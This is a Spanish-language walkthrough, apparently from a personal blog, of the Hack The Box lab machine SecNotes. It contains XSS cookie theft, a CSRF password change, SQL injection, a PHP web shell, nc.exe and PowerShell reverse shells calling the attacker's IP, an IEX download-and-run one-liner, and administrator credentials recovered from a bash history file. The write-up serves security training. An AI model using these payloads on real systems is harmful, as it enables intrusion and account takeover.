---
title: Hack The Box SecNotes
author: k4miyo
date: 2021-12-26
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Medium, Windows]
tags: [CSRF, Windows, SQL, PHP, Powershell, SQLi, Web]
ping: true
---

## SecNotes
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.97.

```bash
❯ ping -c 1 10.10.10.97
PING 10.10.10.97 (10.10.10.97) 56(84) bytes of data.
64 bytes from 10.10.10.97: icmp_seq=1 ttl=127 time=508 ms

--- 10.10.10.97 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 508.005/508.005/508.005/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.97 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-17 22:14 CST
Initiating SYN Stealth Scan at 22:14
Scanning 10.10.10.97 [65535 ports]
Discovered open port 445/tcp on 10.10.10.97
Discovered open port 80/tcp on 10.10.10.97
Discovered open port 8808/tcp on 10.10.10.97
Completed SYN Stealth Scan at 22:15, 26.97s elapsed (65535 total ports)
Nmap scan report for 10.10.10.97
Host is up, received user-set (0.18s latency).
Scanned at 2021-12-17 22:14:54 CST for 27s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 127
445/tcp  open  microsoft-ds  syn-ack ttl 127
8808/tcp open  ssports-bcast syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.25 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 21 (924B)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬───────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.97
   5   │     [*] Open ports: 80,445,8808
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p80,445,8808 10.10.10.97 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-17 22:16 CST
Nmap scan report for 10.10.10.97
Host is up (0.20s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-title: Secure Notes - Login
|_Requested resource was login.php
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2021-12-17T20:21:44-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2021-12-18T04:21:45
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 2h45m01s, deviation: 4h37m09s, median: 4m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.46 seconds
```

Tenemos puertos que presentan el servicio HTTP, por lo que antes de ingresar vía web, vamos a ver a lo que nos enfrentamos con `whatweb`:

```bash
❯ whatweb http://10.10.10.97/
http://10.10.10.97/ [302 Found] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.97], Microsoft-IIS[10.0], PHP[7.2.7], RedirectLocation[login.php], X-Powered-By[PHP/7.2.7]
http://10.10.10.97/login.php [200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.97], Microsoft-IIS[10.0], PHP[7.2.7], PasswordField[password], Title[Secure Notes - Login], X-Powered-By[PHP/7.2.7]
❯ whatweb http://10.10.10.97:8808/
http://10.10.10.97:8808/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.97], Microsoft-IIS[10.0], Title[IIS Windows]
```

Vemos que para el puerto 80 nos hace una redirección al recurso `login.php` y poca cosa más de valor que nos pueda servir hasta el momento. Ahora si vamos a echarles un ojo vía web.

![""](/assets/images/htb-secnotes/secnotes-web.png)

Antes de probar cosas, notamos que podemos registrarnos, así que es lo que haremos primero y posteriormente vamos a tratar de ingresar con nuestras credenciales.

![""](/assets/images/htb-secnotes/secnotes-web1.png)

Le damos click en el botón ***Sign Out*** y ahora vamos a hacer unas pruebas en el panel de login, como ya contamos con unas credenciales válidas de acceso (las nuestras), vamos a colocar el usuario y una contraseña incorrecta para ver que pasa.

![""](/assets/images/htb-secnotes/secnotes-web4.png)

Tenemos que nos dice que la contraseña es incorrecta, es decir, nos está validando el usuario y lo toma como bueno. Si recordamos que al acceder correctamente nos aparece un banner que nos dice que podríamos contactar con el usuario **tyler**; así que vamos a probar si dicho usuario existe en el panel de login.

![""](/assets/images/htb-secnotes/secnotes-web5.png)

Vemos que el usuario existe, por lo que tenemos un usuario potencial a comprometer y podría tener algunos modulos de administrator con los cuales no contamos en nuestra cuenta que creamos. Ahora, analizando un poco el sitio web, vemos que podemos crear una nota, asi que trataremos de injectar código:

![""](/assets/images/htb-secnotes/secnotes-web2.png)

![""](/assets/images/htb-secnotes/secnotes-web3.png)

Podemos hacer injecciones html, vamos a tratar ahora ***XSS (Cross Site Scripting)***.

![""](/assets/images/htb-secnotes/secnotes-web6.png)

![""](/assets/images/htb-secnotes/secnotes-web7.png)

Ahora, con nuestro pluggin **Edit this cookie** vemos que tenemos una cookie llamanda **PHPSESSID** asociada a nuestra sessión. Por lo tanto, ya debemos estar pensando en un ataque de ***Cookie Hijacking*** del usuario **Tyler**; pero antes que de eso, vamos a validar si podemos hacerlo, así que creamos una nueva nota en donde trataremos de acceder a una imagen de un servidor HTTP (debemos compartir un servidor HTTP con python) y que nos nuestre la cookie de la sessión:

![""](/assets/images/htb-secnotes/secnotes-web8.png)

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.14.27 - - [21/Dec/2021 21:38:00] code 404, message File not found
10.10.14.27 - - [21/Dec/2021 21:38:00] "GET /kamiyo.jpg?cookie=PHPSESSID=oj8st60s6e5jr4bvl102j44dgv HTTP/1.1" 404 -
```

Vemos nuestra cookie de sessión, por lo tanto vamos a mandar la misma injección al usuario **Tyler** en el apartado de **Contact Us**. Sin embargo, no vemos una respuesta por parte del usuario.

![""](/assets/images/htb-secnotes/secnotes-web9.png)

Analizando un poco el sitio web, en el apartado de **Change Password** vemos que la solicitud viaja mediante el método POST; sin embargo, es posible que admita el método GET y una forma de probarlo sería agregando los parámetros en la URL `http://10.10.10.97/change_pass.php?password=hola123&confirm_password=hola123&submit=submit`.

![""](/assets/images/htb-secnotes/secnotes-web10.png)

Y nos dice que el password ha sido actualizado, por lo tanto podríamos probar de mandar dicha dirección URL al usuario **Tyler** para que cambie su propia contraseña a una que nosotros conozcamos y podemos acceder a su cuenta. Para validar que ha dado click en el enlace, vamos a compartirnos un servidor HTTP con python de manera adicional.

![""](/assets/images/htb-secnotes/secnotes-web11.png)

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.97 - - [21/Dec/2021 21:55:42] code 404, message File not found
10.10.10.97 - - [21/Dec/2021 21:55:42] "GET /tyler_pwned HTTP/1.1" 404 -
```

Y a este punto la contraseña del usuario **Tyler** ha sido modificada por **hola123**, vamos a validarlo.

![""](/assets/images/htb-secnotes/secnotes-web12.png)

Otra forma de acceder a una cuenta privilegiada es mediante una injección SQL en el panel de registro ingresando como nombre de usuario `' or 1=1-- -` y lo mismo de contraseña.

![""](/assets/images/htb-secnotes/secnotes-web13.png)

Ahora ingresamos como nuestro nuevo usuario.

![""](/assets/images/htb-secnotes/secnotes-web14.png)

Vemos la notas de todos los usuarios, incluyendo las de **Tyler** en donde tenemos unas credenciales de acceso bajo la nota **new site** y como pista nos dan la ruta `secnotes.htb\new-site`; por lo que ya debemos estar pensando en acceso por el servicio de SMB, por lo que primero trataremos de ver recursos a con una **Null Session** y después con las credenciales que nos dá la página.

```bash
❯ smbclient -L 10.10.10.97 -N
session setup failed: NT_STATUS_ACCESS_DENIED
❯ smbclient -L 10.10.10.97 -U 'tyler'
Enter WORKGROUP\tyler's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        new-site        Disk      
SMB1 disabled -- no workgroup available
❯ smbmap -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' -H 10.10.10.97
[+] IP: 10.10.10.97:445 Name: secnotes.htb                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        new-site                                                READ, WRITE
```

Vemos el recurso `new-site`, por lo que vamos a ingresar y ver que información encontramos.

```bash
❯ smbclient //10.10.10.97/new-site -U 'tyler'
Enter WORKGROUP\tyler's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Aug 19 13:06:14 2018
  ..                                  D        0  Sun Aug 19 13:06:14 2018
  iisstart.htm                        A      696  Thu Jun 21 10:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 10:26:03 2018

                7736063 blocks of size 4096. 3396336 blocks available
smb: \>
```

Vemos archivos asociados a un sitio web y además contamos con permisos de escritura; por lo que ya debemos estar pensando en subir un archivo aspx malicioso que nos permite la ejecución de código remoto; por lo tanto vamos a crear un archivo de prueba y tratar de verlo vía web por el puerto 8808:

```bash
❯ echo "Esto es una prueba" > test.txt
❯ smbclient //10.10.10.97/new-site -U 'tyler'
Enter WORKGROUP\tyler's password: 
Try "help" to get a list of possible commands.
smb: \> put test.txt
putting file test.txt as \test.txt (0.0 kb/s) (average 1.7 kb/s)
smb: \> dir
  .                                   D        0  Sun Dec 26 18:26:26 2021
  ..                                  D        0  Sun Dec 26 18:26:26 2021
  iisstart.htm                        A      696  Thu Jun 21 10:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 10:26:03 2018
  test.txt                            A       19  Sun Dec 26 18:26:27 2021

                7736063 blocks of size 4096. 3396794 blocks available
smb: \>
```

Vamos a verlo vía web:

![""](/assets/images/htb-secnotes/secnotes-web15.png)

Como el sitio web nos interpreta archivos php, podemos crear nuestro archivo php que nos permita la ejecución de comandos a nivel de sistema y lo subimos al sistema.

```php
<?php
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"
?>
```

```bash
smb: \> put shell.php
putting file shell.php as \shell.php (0.2 kb/s) (average 1.7 kb/s)
smb: \> 
```

Ahora si tratamos de ejecutar un comando:

![""](/assets/images/htb-secnotes/secnotes-web16.png)

Lo que nos queda es ingresar al sistema mediante una reverse shell haciendo uso del archivo `nc.exe`, por lo que tambíen lo subimos al sistema, nos ponemos en escucha por el puerto 443 y ejecutamos nuestra reverse shell:

```bash
smb: \> put nc.exe
putting file nc.exe as \nc.exe (49.2 kb/s) (average 7.5 kb/s)
smb: \> dir
  .                                   D        0  Sun Dec 26 18:52:25 2021
  ..                                  D        0  Sun Dec 26 18:52:25 2021
  iisstart.htm                        A      696  Thu Jun 21 10:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 10:26:03 2018
  nc.exe                              A    28160  Sun Dec 26 18:52:26 2021
  shell.php                           A       65  Sun Dec 26 18:50:33 2021

                7736063 blocks of size 4096. 3397277 blocks available
smb: \>
```

- `http://10.10.10.97:8808/shell.php?cmd=nc.exe -e cmd 10.10.14.27 443`

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.97] 51477
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

whoami
whoami
secnotes\tyler

C:\inetpub\new-site>
```

Ya nos encontramos en la máquina como el usuario **tyler** y podemos visualizar la flag (user.txt). Por lo que ahora nos falta escalar privilegios; por lo que si accedemos al escritorio del usuario **tyler** vemos que tiene un archivo curioso llamando `bash.lnk`, es decir, un hipervínculo. Para obtener el origen de dicho archivo, vamos a obtener una reverse shell con powershell. 

```bash
C:\Users\tyler\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 1E7B-9B76

 Directory of C:\Users\tyler\Desktop

08/19/2018  02:51 PM    <DIR>          .
08/19/2018  02:51 PM    <DIR>          ..
06/22/2018  02:09 AM             1,293 bash.lnk
08/02/2021  02:32 AM             1,210 Command Prompt.lnk
04/11/2018  03:34 PM               407 File Explorer.lnk
06/21/2018  04:50 PM             1,417 Microsoft Edge.lnk
06/21/2018  08:17 AM             1,110 Notepad++.lnk
12/26/2021  04:14 PM                34 user.txt
08/19/2018  09:59 AM             2,494 Windows PowerShell.lnk
               7 File(s)          7,965 bytes
               2 Dir(s)  13,913,157,632 bytes free

C:\Users\tyler\Desktop>
```

Por lo que primero, vamos a buscar nuestro archivo `Invoke-PowerShellTcp.ps1`, lo traemos a nuestro directorio de trabajo y al final del archivo, agregamos la linea `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.27 -Port 443`:

```bash
❯ locate Invoke-PowerShellTcp
/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1
/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLineBind.ps1
❯ cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
```

Nos compartimos un servidor HTTP con python, nos ponemos en escucha por el puerto 443 y procedemos a entablarnos una reverse shell en powershell.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.97 - - [26/Dec/2021 19:23:03] "GET /PS.ps1 HTTP/1.1" 200 -
```

```bash
C:\Users\tyler\Desktop> powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.27/PS.ps1')
```

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.97] 53148
Windows PowerShell running as user SECNOTES$ on SECNOTES
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

whoami
secnotes\tyler
PS C:\Users\tyler\Desktop>
```

Ahora, vamos a crear un objecto llamado `Wscript` y la variable `shortcut` que nos ayudarán a obtener información sobre el archivo `bash.lnk`:

```bash
PS C:\Users\tyler\Desktop> $Wscript = New-Object -ComObject Wscript.Shell
PS C:\Users\tyler\Desktop> $shortcut = Get-ChildItem bash.lnk
PS C:\Users\tyler\Desktop> $Wscript.CreateShortcut($shortcut)


FullName         : C:\Users\tyler\Desktop\bash.lnk
Arguments        : 
Description      : 
Hotkey           : 
IconLocation     : ,0
RelativePath     : 
TargetPath       : C:\Windows\System32\bash.exe
WindowStyle      : 1
WorkingDirectory : C:\Windows\System32



PS C:\Users\tyler\Desktop>
```

Aqui vemos que la ruta del archivo `bash` es bajo `C:\Windows\System32\bash.exe` y solo para confirmar, vamos a realizar una búsqueda recursiva en la raiz por `bash.exe`:

```bash
PS C:\> Get-ChildItem -Path C:\ -Filter bash.exe -Recurse -ErrorAction SilentlyContinue -Force


    Directory: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        6/21/2018   3:02 PM         115712 bash.exe                                                              

PS C:\> 
```

Con el comando anterior, vemos que el archivo está realmente bajo la ruta `C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5`. Ahora, pensando un poco, existe un archivo llamado `bash.exe` y si vemos los directorios en la raiz `C:\`, existe uno como se llama `Distros` y un archivo `Ubuntu.zip`; por lo que ya nos hace pensar que tal vez exista un servidor Ubuntu ejecutandose en la máquina y con el archivo `bash.exe` podríamos acceder a dicho servidor.

```bash
C:\> dir
 Volume in drive C has no label.
 Volume Serial Number is 1E7B-9B76

 Directory of C:\

06/21/2018  02:07 PM    <DIR>          Distros
06/21/2018  05:47 PM    <DIR>          inetpub
06/22/2018  01:09 PM    <DIR>          Microsoft
04/11/2018  03:38 PM    <DIR>          PerfLogs
06/21/2018  07:15 AM    <DIR>          php7
01/26/2021  02:39 AM    <DIR>          Program Files
01/26/2021  02:38 AM    <DIR>          Program Files (x86)
06/21/2018  02:07 PM       201,749,452 Ubuntu.zip
06/21/2018  02:00 PM    <DIR>          Users
01/26/2021  02:38 AM    <DIR>          Windows
               1 File(s)    201,749,452 bytes
               9 Dir(s)  13,910,695,936 bytes free

C:\>
```

Por lo tanto, vamos a ejecutar `C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe` para ver que pasa.

```bash
C:\> C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
mesg: ttyname failed: Inappropriate ioctl for device
whoami
root
script /dev/null -c bash
Script started, file is /dev/null
root@SECNOTES:~# whoami
root
root@SECNOTES:~# ll
total 8
drwx------ 1 root root  512 Jun 22  2018 ./
drwxr-xr-x 1 root root  512 Jun 21  2018 ../
---------- 1 root root  398 Jun 22  2018 .bash_history
-rw-r--r-- 1 root root 3112 Jun 22  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem/
root@SECNOTES:~# cat .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history 
less .bash_history
exitroot@SECNOTES:~#
```

Si checamos el archivo `.bash_history`, podemos ver los comandos a ha hecho el usuario **root** del servidor Ubuntu y nos encontramos con algo curioso, unas credenciales del usuario **Administrator**, por lo que ya sabemos, guardamos todas las credenciales que encontremos y vamos a validarlas.

```bash
❯ crackmapexec smb 10.10.10.97 -u 'Administrator' -p 'u6!4ZwgwOM#^OBf#Nwnh'
SMB         10.10.10.97     445    SECNOTES         [*] Windows 10 Enterprise 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True)
SMB         10.10.10.97     445    SECNOTES         [+] SECNOTES\Administrator:u6!4ZwgwOM#^OBf#Nwnh (Pwn3d!)
```

Las credenciales son válidas y tenemos ejecución de comandos (*Pwn3d!*),  por lo tanto, nos conectamos a la máquina con la herramienta `psexec.py`:

```bash
❯ /root/.local/pipx/venvs/crackmapexec/bin/psexec.py WORKGROUP/Administrator:u6\!4ZwgwOM#^OBf#Nwnh@10.10.10.97
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.97.....
[*] Found writable share ADMIN$
[*] Uploading file bseZoTmQ.exe
[*] Opening SVCManager on 10.10.10.97.....
[*] Creating service ZuAc on 10.10.10.97.....
[*] Starting service ZuAc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
nt authority\system

C:\WINDOWS\system32>
```

Ya somos el usuario `nt authority\system` y podemos visualizar la flag (root.txt).
